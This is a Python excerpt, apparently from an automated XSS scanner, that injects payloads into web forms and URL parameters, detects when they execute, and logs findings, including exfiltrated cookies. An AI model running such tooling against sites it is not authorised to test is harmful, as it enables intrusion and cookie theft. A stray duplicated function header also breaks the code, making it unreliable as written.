    async def _wait_for_trigger(self, page: Page, result: dict, exec_token: str = "", console_buffer: List[str] = None, max_wait_ms: int = 3000):
        if console_buffer is None:
            console_buffer = []
        # FP hardened wait
        ALLOWED_SINKS = {'alert','confirm','prompt','eval','Function'}
        await page.wait_for_timeout(350)
        end_t = asyncio.get_event_loop().time() + max_wait_ms/1000.0
        while asyncio.get_event_loop().time() < end_t:
            # if already triggered externally, verify HIGH confidence
            if result.get("triggered"):
                if result.get("confidence") == "HIGH" or "token_match" in result.get("method",""):
                    return True
                # low confidence -> reset and keep waiting
                result["triggered"] = False
            # JS hook check - STRICT
            try:
                fired = await page.evaluate("()=>window.__xss_fired||[]")
                if fired:
                    # only allowed sinks, must contain exec_token
                    good = []
                    for f in fired:
                        sink = f.get('sink','')
                        if sink not in ALLOWED_SINKS:
                            continue
                        ftok = f.get('token') or ''
                        fdata = str(f.get('data',''))
                        fconf = f.get('confidence','LOW')
                        if fconf == 'LOW':
                            continue
                        # token mandatory if exec_token looks like OBSCURA_
                        if exec_token and exec_token.startswith('OBSCURA_'):
                            if exec_token not in ftok and exec_token not in fdata:
                                continue
                        good.append(f)
                    if good:
                        hit = good[0]
                        result["triggered"] = True
                        result["method"] = "js_hook:" + str(hit.get("sink","?"))
                        result["detail"] = str(hit.get("data",""))[:200]
                        result["confidence"] = hit.get("confidence","HIGH")
                        # double verify stability
                        await asyncio.sleep(0.22)
                        fired2 = await page.evaluate("(tok)=>{const a=window.__xss_fired||[]; return a.filter(x=>x.token===tok && ['alert','confirm','prompt','eval','Function'].includes(x.sink))}", exec_token)
                        if fired2 and len(fired2) > 0:
                            return True
                        # FP – reset
                        result["triggered"] = False
            except Exception:
                pass
            # console – MUST be __XSS_TRIGGER__ AND token
            if console_buffer:
                hit = next((c for c in console_buffer if "__XSS_TRIGGER__" in c and exec_token and exec_token in c), None)
                if hit:
                    result["triggered"] = True
                    result["method"] = "console_token_match"
                    result["detail"] = hit
                    result["confidence"] = "HIGH"
                    return True
            await asyncio.sleep(0.22)
        # final gate: accept only HIGH/MEDIUM with token evidence
        if result.get("triggered"):
            if result.get("confidence") not in ("HIGH","MEDIUM"):
                return False
            # for OBSCURA tokens, require token in detail
            if exec_token and exec_token.startswith("OBSCURA_"):
                if exec_token not in str(result.get("detail","")):
                    # last chance: check fired array
                    try:
                        import json as _json
                    except: pass
                    return False
            return True
        return False

    async def _safe_navigate
    async def _safe_navigate(self, page: Page, url: str) -> bool:
        interrupted_markers = [
            "interrupted by another navigation",
            "navigation occurred",
            "frame was detached",
        ]
        for wait_until, timeout in [("domcontentloaded", 15000), ("commit", 10000)]:
            try:
                await page.goto(url, wait_until=wait_until, timeout=timeout)
                return True
            except Exception as e:
                err = str(e).lower()
                if any(m in err for m in interrupted_markers):
                    print(f"          [i] Navigation interrupted — soft-success")
                    return True
                if "timeout" in err:
                    print(f"          [⚠] Navigation timeout ({wait_until}) — continuing anyway")
                    continue
                if "protocol error" in err and "page.navigate" in err:
                    await page.wait_for_timeout(800)
                    current_url = page.url
                    if current_url and current_url != "about:blank":
                        print(f"          [i] Page navigated to: {current_url[:90]} — soft-success")
                        return True
                    continue
                print(f"          [⚠] nav error ({wait_until}): {str(e)[:80]}")
                return False

        print(f"          [⚠] All navigation attempts failed — continuing anyway")
        return True

    async def _fill_and_submit_smart(self, page: Page, param_name: str, payload: str, form_page_url: str = "") -> str:
        try:
            form_data = await page.evaluate(f"""
            () => {{
                const paramName = '{param_name}';
                const skip = new Set(['submit','button','reset','image','file','checkbox','radio']);

                let targetEl = null;
                for (const el of document.querySelectorAll('input,textarea,select')) {{
                    const key = el.name || el.id || '';
                    if (key === paramName || key.toLowerCase() === paramName.toLowerCase()) {{
                        targetEl = el; break;
                    }}
                }}

                if (!targetEl) {{
                    const lower = paramName.toLowerCase();
                    for (const el of document.querySelectorAll('input,textarea,select')) {{
                        const t = (el.type||'').toLowerCase();
                        if (skip.has(t)) continue;
                        const k = (el.name||el.id||'').toLowerCase();
                        if (k && k.includes(lower)) {{ targetEl = el; break; }}
                    }}
                }}

                if (!targetEl) return null;

                const targetSel = targetEl.name ? `[name='${{targetEl.name}}']` : `#${{targetEl.id}}`;

                const form = targetEl.closest('form');
                const container = form || document;
                const others = [];

                for (const el of container.querySelectorAll('input,textarea,select')) {{
                    const t = (el.type||'text').toLowerCase();
                    const key = el.name || el.id || '';
                    if (!key) continue;
                    if (skip.has(t)) continue;
                    if (key === targetEl.name || key === targetEl.id) continue;
                    others.push({{
                        sel: el.name ? `[name='${{el.name}}']` : `#${{el.id}}`,
                        tag: el.tagName, type: t,
                        name: el.name||'', id: el.id||'', placeholder: el.placeholder||'',
                        empty: !el.value || el.value.trim() === '',
                    }});
                }}

                return {{targetSel, others}};
            }}
            """)
        except Exception as e:
            return f"form_scan_error: {str(e)[:60]}"

        if not form_data or not form_data.get('targetSel'):
            return 'input_not_found'

        target_sel = form_data['targetSel']
        others = form_data.get('others', [])

        def guess_value(name, id_, ftype, tag, ph):
            h = (name + id_ + ph + ftype).lower()
            if 'email' in h or ftype == 'email':    return 'test@example.com'
            if any(k in h for k in ['pass','pwd','secret']) or ftype == 'password': return 'Password123!'
            if any(k in h for k in ['phone','mobile','tel']) or ftype == 'tel':     return '+1234567890'
            if any(k in h for k in ['user','login','uname']):  return 'testuser'
            if 'first' in h or 'fname' in h:         return 'John'
            if 'last' in h or 'lname' in h:         return 'Doe'
            if 'name' in h:                          return 'John Doe'
            if any(k in h for k in ['comment','message','review','feedback','body','content']): return 'Test comment.'
            if any(k in h for k in ['subject','title']):        return 'Test Subject'
            if any(k in h for k in ['address','street']):       return '123 Test St'
            if 'city' in h:                         return 'Tehran'
            if 'country' in h:                         return 'Iran'
            if any(k in h for k in ['url','website','link']) or ftype == 'url': return 'https://example.com'
            if ftype == 'number':                      return '1'
            if ftype == 'date':                        return '2000-01-01'
            if ftype == 'time':                        return '12:00'
            if tag == 'TEXTAREA':                      return 'Test content.'
            return 'testvalue'

        for f in others:
            if not f.get('empty', True):
                continue
            val = guess_value(f['name'], f['id'], f['type'], f['tag'], f['placeholder'])
            try:
                await page.evaluate(f"""
                () => {{
                    const el = document.querySelector("{f['sel']}");
                    if (!el) return;
                    if (el.tagName === 'SELECT') {{
                        const opts = Array.from(el.options).filter(o => o.value);
                        if (opts.length) el.value = opts[0].value;
                    }} else {{
                        const proto = el.tagName === 'TEXTAREA'
                            ? window.HTMLTextAreaElement.prototype
                            : window.HTMLInputElement.prototype;
                        const setter = Object.getOwnPropertyDescriptor(proto, 'value')?.set;
                        if (setter) setter.call(el, '{val}'); else el.value = '{val}';
                    }}
                    el.dispatchEvent(new Event('input',  {{bubbles:true}}));
                    el.dispatchEvent(new Event('change', {{bubbles:true}}));
                }}
                """)
            except Exception:
                pass

        try:
            await page.evaluate(
                """(args) => {
                    const {sel, value} = args;
                    const el = document.querySelector(sel);
                    if (!el) return false;
                    const proto = el.tagName === 'TEXTAREA'
                        ? window.HTMLTextAreaElement.prototype
                        : window.HTMLInputElement.prototype;
                    const setter = Object.getOwnPropertyDescriptor(proto, 'value')?.set;
                    if (setter) setter.call(el, value); else el.value = value;
                    el.dispatchEvent(new Event('input',  {bubbles: true}));
                    el.dispatchEvent(new Event('change', {bubbles: true}));
                    el.dispatchEvent(new Event('blur',   {bubbles: true}));
                    return true;
                }""",
                {"sel": target_sel, "value": payload}
            )
        except Exception as e:
            return f"payload_inject_error: {str(e)[:80]}"

        return await self._submit_form(page, param_name, form_page_url)

    async def _submit_form(self, page: Page, param_name: str, form_page_url: str = "") -> str:
        btn_info = await page.evaluate(f"""
        () => {{
            const el = document.querySelector("[name='{param_name}'], [id='{param_name}']");
            if (!el) return {{found: false}};
            const form = el.closest('form');
            if (!form) return {{found: true, hasForm: false}};
            const btn = form.querySelector('button[type=submit], input[type=submit], button:not([type])');
            return {{
                found: true, hasForm: true, hasBtn: !!btn,
                btnSel: btn ? (btn.id ? '#'+btn.id : btn.type==='submit' ? 'input[type=submit]' : 'button:not([type])') : null,
            }};
        }}
        """)

        if not btn_info.get('found'):
            return 'target_lost'

        if not btn_info.get('hasForm'):
            try:
                async with page.expect_navigation(wait_until="domcontentloaded", timeout=8000):
                    await page.evaluate(f"""
                    () => {{
                        const el = document.querySelector("[name='{param_name}'], [id='{param_name}']");
                        if (el) el.dispatchEvent(new KeyboardEvent('keydown',{{key:'Enter',code:'Enter',keyCode:13,bubbles:true}}));
                    }}
                    """)
                return 'enter_pressed + nav_complete'
            except Exception:
                return 'enter_pressed (no_nav)'

        btn_sel = btn_info.get('btnSel') or 'button[type=submit], input[type=submit], button:not([type])'
        try:
            btn_loc = page.locator(btn_sel).first
            if await btn_loc.count() == 0:
                raise Exception("btn not in DOM")
            async with page.expect_navigation(wait_until="domcontentloaded", timeout=10000):
                await btn_loc.click(timeout=5000)
            return 'btn_clicked + nav_complete'
        except Exception as e:
            err = str(e).lower()
            if 'navigation' in err or 'timeout' in err or 'btn not' in err:
                try:
                    await btn_loc.click(timeout=3000)
                    await page.wait_for_timeout(1500)
                    cur = page.url
                    return f"btn_clicked + {'spa_nav' if form_page_url and cur != form_page_url else 'no_nav'}"
                except Exception:
                    pass

        try:
            async with page.expect_navigation(wait_until="domcontentloaded", timeout=8000):
                await page.evaluate(f"""
                () => {{
                    const el = document.querySelector("[name='{param_name}'], [id='{param_name}']");
                    if (el) {{ const f = el.closest('form'); if (f) f.submit(); }}
                }}
                """)
            return 'form_submit + nav_complete'
        except Exception:
            return 'form_submit (no_nav)'

    def _inject_to_url(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                           parsed.params, new_query, parsed.fragment))

    # PATCH: make_vuln now accepts exec_token
    def _make_vuln(self, target, payload, name, detection, url, exec_token="") -> Vulnerability:
        exf = detection.get('exfiltrated') or {}
        vuln = Vulnerability(
            category="XSS",
            severity="CRITICAL" if exf.get('cookie') else "HIGH",
            match=name,
            source=url,
            endpoint=url,
            payload=payload,
            parameter=target.param_name,
            proof=f"method={detection.get('method','?')} | token={exec_token} | {detection.get('detail','')[:200]}",
            cwe_id="CWE-79",
        )
        if exf:
            vuln.exfiltrated_data = exf
        return vuln
